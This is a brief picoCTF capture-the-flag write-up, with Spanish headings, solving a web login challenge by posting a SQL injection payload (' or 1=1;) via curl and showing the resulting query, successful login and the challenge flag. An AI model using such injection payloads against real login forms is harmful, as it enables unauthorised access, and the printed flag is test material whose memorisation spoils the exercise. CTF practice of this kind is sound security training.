## Objetivo
`https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!
## Solución
```bash
hervi-picoctf@webshell:~$ curl https://jupiter.challenges.picoctf.org/problem/39720/login.php -d "username=admin$password=' or 1=1;&debug=1"
<pre>username: admin=' or 1=1;
password: 
SQL query: SELECT * FROM users WHERE name='admin=' or 1=1;' AND password=''
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_c218b685}</p>hervi-pico
```